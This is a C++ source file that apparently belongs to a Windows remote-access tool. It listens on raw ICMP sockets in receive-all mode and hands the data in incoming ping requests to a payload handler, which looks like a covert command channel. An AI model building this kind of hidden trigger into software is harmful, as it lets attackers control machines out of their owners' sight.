//
// MIT License
//
// Copyright (c) 2019 Rokas Kupstys
//
// Permission is hereby granted, free of charge, to any person obtaining a
// copy of this software and associated documentation files (the "Software"),
// to deal in the Software without restriction, including without limitation
// the rights to use, copy, modify, merge, publish, distribute, sublicense,
// and/or sell copies of the Software, and to permit persons to whom the
// Software is furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in
// all copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
// THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
// FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
// DEALINGS IN THE SOFTWARE.
//
#include <stdint.h>
#include <winsock2.h>
#include <mstcpip.h>
#include <iphlpapi.h>
#include <ws2tcpip.h>
#include <inaddr.h>
#include <stl/unordered_map.h>
#include <stl/string.h>
#include <assert.h>
#include "../shared/coroutine.h"
#include "../shared/debug.h"
#include "../shared/payload.h"
#include "../config.h"
#include "icmp.hpp"

SOCKET icmp_make_socket(int af, const sockaddr* addr, int alen)
{
    SOCKET s = socket(af, SOCK_RAW, IPPROTO_ICMP);

    if (s == INVALID_SOCKET)
    {
        LOG_ERROR("Could not create ICMP socket [%d]", WSAGetLastError());
        return INVALID_SOCKET;
    }

    unsigned ttl = 128;
    if (setsockopt(s, IPPROTO_IP, IP_TTL, (const char*)&ttl, sizeof(ttl)) == SOCKET_ERROR)
    {
        LOG_ERROR("TTL setsockopt failed [%d]", WSAGetLastError());
        closesocket(s);
        return INVALID_SOCKET;
    }

    if (bind(s, addr, alen) == SOCKET_ERROR)
    {
        LOG_ERROR("bind failed with error [%d]", WSAGetLastError());
        closesocket(s);
        return INVALID_SOCKET;
    }

    unsigned optval = 1;
    DWORD bytesReturned;
    if (WSAIoctl(s, SIO_RCVALL, &optval, sizeof(optval), nullptr, 0, &bytesReturned, nullptr, nullptr) == SOCKET_ERROR)
    {
        LOG_ERROR("WSAIotcl() failed with error code [%d]", WSAGetLastError());
        closesocket(s);
        return INVALID_SOCKET;
    }

    optval = 0;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&optval, sizeof(optval)) == SOCKET_ERROR)
    {
        LOG_ERROR("Failed to remove IP header. Error code: [%d]", WSAGetLastError());
        closesocket(s);
        return INVALID_SOCKET;
    }

    u_long nonblock = 1;
    if (ioctlsocket(s, FIONBIO, &nonblock) == SOCKET_ERROR)
    {
        LOG_ERROR("Could not set ICMP socket as non blocking [%d]", WSAGetLastError());
        closesocket(s);
        return INVALID_SOCKET;
    }

    return s;
}

void icmp_scan_interfaces(stl::unordered_map<stl::string, SOCKET>& icmp_sockets)
{
    unsigned af_type[] = {AF_INET, AF_INET6};
    stl::string address;
    stl::vector<uint8_t> buf;
    for (unsigned af : af_type)
    {
        ULONG bufSize = 0;
        GetAdaptersAddresses(af, 0, nullptr, nullptr, &bufSize);
        buf.resize(bufSize, 0);
        if(GetAdaptersAddresses(af, 0, nullptr, PIP_ADAPTER_ADDRESSES(buf.data()), &bufSize) != ERROR_SUCCESS)
        {
            LOG_ERROR("Could not get adapter addresses");
            break;
        }
        auto current = PIP_ADAPTER_ADDRESSES(buf.data());
        while (current)
        {
            SOCKET_ADDRESS* addr = &current->FirstUnicastAddress->Address;

            if (af == AF_INET)
            {
                auto* ip4 = reinterpret_cast<sockaddr_in*>(addr->lpSockaddr);
                address = inet_ntoa(ip4->sin_addr);
            }
            else if (af == AF_INET6)
            {
                current = current->Next;
                continue;   // TODO
            }
            else
                assert(false);

            auto it = icmp_sockets.find(address);
            if (it == icmp_sockets.end() || it->second == INVALID_SOCKET)
            {
                SOCKET s = icmp_make_socket(addr->lpSockaddr->sa_family, addr->lpSockaddr, addr->iSockaddrLength);
                if (s != INVALID_SOCKET)
                {
                    icmp_sockets[address] = s;
                    LOG_DEBUG("Monitor ICMP on %s", address.c_str());
                }
            }
            current = current->Next;
        }
    }
}

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wmissing-noreturn"
void icmp_thread(context& ctx)
{
    stl::unordered_map<stl::string, SOCKET> icmp_sockets{};

    static uint8_t packet_buffer[0x10000]{};

    unsigned last_interfaces_scan = GetTickCount();
    icmp_scan_interfaces(icmp_sockets);

    while (coroutine_loop::current_loop->is_active())
    {
        // Rescan interfaces once a day if any sockets are active or once a hour if none are active.
        if ((GetTickCount() - last_interfaces_scan) >= (icmp_sockets.empty() ? 1_hour : 24_hour))
        {
            icmp_scan_interfaces(icmp_sockets);
            last_interfaces_scan = GetTickCount();
        }

        fd_set fds;
        FD_ZERO(&fds);

        for (auto it = icmp_sockets.begin(); it != icmp_sockets.end(); ++it)
            FD_SET(it->second, &fds);

        if (!fds.fd_count)
        {
            yield(30_sec);
            continue;
        }

        timeval tv{};
        tv.tv_usec = 100;
        int n = select(0, &fds, nullptr, nullptr, &tv);
        if (n == SOCKET_ERROR)
        {
            LOG_ERROR("ICMP Socket error [%d]", WSAGetLastError());
            yield(30_sec);
            continue;
        }
        else if (n)
        {
            for (uint32_t i = 0; i < fds.fd_count; i++)
            {
                SOCKET s = fds.fd_array[i];
                sockaddr from{};
                sockaddr to{};
                int to_size = sizeof(to);
                getsockname(s, &to, &to_size);
                int from_len = sizeof(from);
                int len = recvfrom(s, (char*)packet_buffer, sizeof(packet_buffer), 0, (sockaddr*)&from, &from_len);

                // auto* from_in4 = reinterpret_cast<sockaddr_in*>(&from);
                auto* to_in4 = reinterpret_cast<sockaddr_in*>(&to);
                if (len > 0)
                {
                    if (from.sa_family == AF_INET && to.sa_family == AF_INET)
                    {
                        iphdr& ip = *(iphdr*)packet_buffer;
                        icmphdr& icmp = *(icmphdr*)(PBYTE(packet_buffer) + ip.ihl * 4);
                        if (icmp.type != ICMP_ECHO_REQUEST)
                            continue;

                        if (ip.daddr != to_in4->sin_addr.S_un.S_addr)
                        {
                            in_addr daddr{};
                            daddr.S_un.S_addr = ip.daddr;
                            LOG_DEBUG("ICMP discarded because it was meant for other machine %s and we listen on %s",
                                inet_ntoa(daddr), inet_ntoa(to_in4->sin_addr));
                            continue;
                        }

                        uint32_t icmp_len = len - ip.ihl * 4U;
                        uint32_t datalen = (icmp_len - ICMP_MIN);
                        uint8_t* data = (uint8_t*)(&icmp) + ICMP_MIN;

                        handle_payload(ctx, data, datalen);
                    }
                }
                else if (len == SOCKET_ERROR)
                {
                    LOG_WARNING("recvfrom error [%d]", WSAGetLastError());
                    for (auto it = icmp_sockets.begin(); it != icmp_sockets.end(); ++it)
                    {
                        if (it->second == s)
                        {
                            icmp_sockets.erase(it);
                            break;
                        }
                    }
                    closesocket(s);
                }
            }
        }

        yield(1_sec);
    }
}
#pragma clang diagnostic pop
